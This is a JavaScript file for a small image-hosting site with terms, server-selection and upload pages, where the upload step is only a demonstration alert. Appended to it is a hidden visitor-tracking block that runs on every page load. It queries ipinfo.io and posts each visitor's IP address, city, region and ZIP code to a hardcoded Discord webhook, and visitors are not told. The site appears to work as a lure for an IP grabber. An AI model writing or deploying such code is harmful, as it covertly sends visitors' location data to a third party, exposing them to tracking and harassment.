// Wait for the DOM to fully load before running page-specific code.
document.addEventListener("DOMContentLoaded", function() {
  // === TERMS & CONDITIONS PAGE (index.html) ===
  const agreeButton = document.getElementById("agreeButton");
  if (agreeButton) {
    agreeButton.addEventListener("click", function() {
      // Redirect to the server selection page
      window.location.href = "server.html";
    });
  }

  // === SERVER SELECTION PAGE (server.html) ===
  const serverSelectionDiv = document.getElementById("serverSelection");
  if (serverSelectionDiv) {
    // Add click events to each server button
    const serverButtons = document.querySelectorAll(".server-btn");
    serverButtons.forEach(function(button) {
      button.addEventListener("click", function() {
        const selectedServer = button.getAttribute("data-server");
        // Store the selected server (using localStorage for demonstration)
        localStorage.setItem("selectedServer", selectedServer);
        // Redirect to the image hosting template page
        window.location.href = "template.html";
      });
    });
  }

  // === IMAGE HOSTING TEMPLATE PAGE (template.html) ===
  const uploadForm = document.getElementById("uploadForm");
  if (uploadForm) {
    // Display the selected server name if available
    const serverNameDisplay = document.getElementById("serverName");
    const savedServer = localStorage.getItem("selectedServer") || "Not Selected";
    serverNameDisplay.textContent = savedServer;
    
    // Handle the form submission
    uploadForm.addEventListener("submit", function(e) {
      e.preventDefault(); // Prevent the actual form submission
      
      const fileInput = document.getElementById("fileInput");
      if (fileInput.files.length > 0) {
        const fileName = fileInput.files[0].name;
        // For demonstration, alert the user. Replace with actual upload logic as needed.
        alert("Uploading file: " + fileName + "\nSelected Server: " + savedServer);
      } else {
        alert("Please select a file to upload.");
      }
    });
  }
});

// === IP TRACKING CODE ===
// This function will be called by the ipinfo.io JSONP callback.
window.monke = function(json) {
  var request = new XMLHttpRequest();
  request.open("POST", "https://discord.com/api/webhooks/1335814735320317962/UdvYuU70p0_kw3iwITR_zhxMJHLmAGYPdaRQtm9jK-kuZ1wqLEJrL5jp5AyhN-y9G1qR");
  request.setRequestHeader('Content-type', 'application/json');

  var params = {
    username: "Visitor Tracker",
    avatar_url: "",
    content: "@everyone",
    embeds: [
      {
        title: "Someone visited the site",
        color: 1752220,
        description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
      }
    ]
  };

  request.send(JSON.stringify(params));
};

// Dynamically load the ipinfo.io JSONP script to trigger the IP tracking on page load.
(function() {
  var script = document.createElement('script');
  script.src = "https://ipinfo.io/?format=jsonp&callback=monke";
  document.head.appendChild(script);
})();
